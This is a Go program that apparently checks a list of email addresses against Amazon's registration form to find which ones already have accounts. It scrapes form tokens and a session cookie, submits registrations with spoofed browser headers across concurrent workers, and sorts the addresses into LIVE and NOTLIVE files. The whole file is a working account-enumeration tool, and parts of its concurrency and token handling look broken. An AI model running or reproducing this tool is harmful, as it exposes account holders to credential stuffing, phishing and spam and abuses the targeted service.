package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"

	"github.com/gocolly/colly"
	"github.com/gocolly/colly/queue"
	"github.com/gookit/color"
)

const url = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"

var ubidMain = ""

func main() {
	file, err := os.Open("./email.txt")

	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()

	jobs := make(chan string)
	results := make(chan int)

	// I think we need a wait group, not sure.
	wg := new(sync.WaitGroup)

	for w := 1; w <= 10; w++ {
		wg.Add(10)
		go run(jobs, wg, results)
	}

	go func() {
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			jobs <- scanner.Text()
		}
		close(jobs)
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	// Now, add up the results from the results channel until closed
	counts := 0
	for v := range results {
		counts += v
	}

}

func run(email <-chan string, wg *sync.WaitGroup, results <-chan int) {
	defer wg.Done()
	for j := range email {
		appActionToken, prevRID, siteState, workflowState := getHTMLComponent()
		newFormData := generateFormData(appActionToken, prevRID, siteState, workflowState, j)
		getCookie()
		result := checkMail(newFormData)

		if strings.Contains(result, "but an account already exists with the e-mail") {
			color.New(color.FgGreen, color.BgBlack).Println("LIVE : " + j)
			createFile(j, "but an account already exists with the e-mail")
		} else {
			color.New(color.FgRed, color.BgBlack).Println("NOT LIVE : " + j)
			createFile(j, "")
		}
	}
}

func createFile(email string, indicator string) {
	var newEmail = email + "\n"
	if strings.Contains(indicator, "but an account already exists with the e-mail") {
		f, err := os.OpenFile("LIVE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Fatal(err)
		}
		if _, err := f.Write([]byte(newEmail)); err != nil {
			log.Fatal(err)
		}
		if err := f.Close(); err != nil {
			log.Fatal(err)
		}
	} else {
		f, err := os.OpenFile("NOTLIVE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Fatal(err)
		}
		if _, err := f.Write([]byte(newEmail)); err != nil {
			log.Fatal(err)
		}
		if err := f.Close(); err != nil {
			log.Fatal(err)
		}
	}

	//this is my change

}

func generateFormData(appActionToken string, prevRID string, siteState string, workflowState string, email string) map[string]string {
	return map[string]string{
		"appActionToken":   appActionToken,
		"appAction":        "REGISTER",
		"openid.return_to": "openid",
		"prevRID":          prevRID,
		"siteState":        siteState,
		"workflowState":    workflowState,
		"claimToken":       "",
		"customerName":     "Sadmeboy",
		"email":            email,
		"password":         "coegsekali1",
		"passwordCheck":    "coegsekali1",
		"metadata1":        "metadata1",
	}
}

func getHTMLComponent() (string, string, string, string) {
	var workflowState string
	var prevRID string
	// var ces string
	var siteState string
	// var metadata1 string
	// var appActionToken string
	// var openid string
	var appAction string = "REGISTER"

	allActionData := [7]string{"workflowState", "prevRID", "ces", "siteState", "metadata1", "appActionToken", "openid.return_to"}

	c := colly.NewCollector()

	for index := 0; index < len(allActionData); index++ {
		actionData := allActionData[index]
		c.OnHTML("input[name="+actionData+"]", func(e *colly.HTMLElement) {
			switch actionData {
			case "workflowState":
				workflowState = e.Attr("value")
			case "prevRID":
				prevRID = e.Attr("value")
			// case "ces":
			// 	ces = e.Attr("value")
			case "siteState":
				siteState = e.Attr("value")
			// case "metadata1":
			// 	metadata1 = e.Attr("value")
			// case "openid.return_to":
			// 	openid = e.Attr("value")
			default:
				// freebsd, openbsd,
				// plan9, windows...
				// appActionToken = e.Attr("value")
			}
		})
	}

	q, _ := queue.New(
		2, // Number of consumer threads
		&queue.InMemoryQueueStorage{MaxSize: 10000}, // Use default queue storage
	)

	for i := 0; i < 5; i++ {
		// Add URLs to the queue
		q.AddURL(fmt.Sprintf("%s?n=%d", url, i))
	}

	q.Run(c)

	return appAction, prevRID, siteState, workflowState

}

func checkMail(formData map[string]string) string {
	var result string
	c := colly.NewCollector()

	c.OnRequest(func(r *colly.Request) {
		r.Headers.Set("authority", "www.amazon.com")
		r.Headers.Set("cache-control", "max-age=0")
		r.Headers.Set("origin", "https://www.amazon.com")
		r.Headers.Set("upgrade-insecure-requests", "1")
		r.Headers.Set("content-type", "application/x-www-form-urlencoded")
		r.Headers.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36")
		r.Headers.Set("sec-fetch-user", "?1")
		r.Headers.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3")
		r.Headers.Set("sec-fetch-site", "same-origin")
		r.Headers.Set("sec-fetch-mode", "navigate")
		r.Headers.Set("referer", "https://www.amazon.com/ap/register")
		r.Headers.Set("accept-encoding", "gzip, deflate, br")
		r.Headers.Set("accept-language", "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7")
		r.Headers.Set("cookie", "ubid-main="+ubidMain+";")
	})

	// On every a element which has href attribute call callback
	c.OnHTML("ul.a-unordered-list.a-nostyle.a-vertical.a-spacing-none", func(e *colly.HTMLElement) {
		result = strings.TrimSpace(e.Text)
	})

	c.Post(url, formData)
	c.Wait()

	return result
}

func getCookie() {
	resp, err := http.Get("https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue")
	if err != nil {
		log.Fatalln(err)
	}
	for _, cookie := range resp.Cookies() {
		if len(cookie.Value) > 13 {
			ubidMain = cookie.Value
		}
	}
}
